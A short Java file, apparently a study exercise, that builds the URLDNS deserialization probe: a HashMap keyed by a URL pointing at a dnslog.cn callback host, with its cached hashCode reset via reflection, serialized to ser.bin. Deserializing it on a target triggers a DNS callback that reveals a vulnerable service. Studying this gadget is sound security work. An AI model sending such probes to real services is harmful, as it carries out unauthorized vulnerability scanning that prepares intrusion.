package org.src;

import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class SerializationTest {
    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException {
        HashMap<URL, Integer> hashmap = new HashMap<>();
        URL url = new URL("http://n8em3x.dnslog.cn");
        Class c = url.getClass();
        Field hashCode = c.getDeclaredField("hashCode");
        hashCode.setAccessible(true);
        hashCode.set(url,1234);
        hashmap.put(url,1);
        hashCode.set(url,-1);
        serialize(hashmap);
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

}
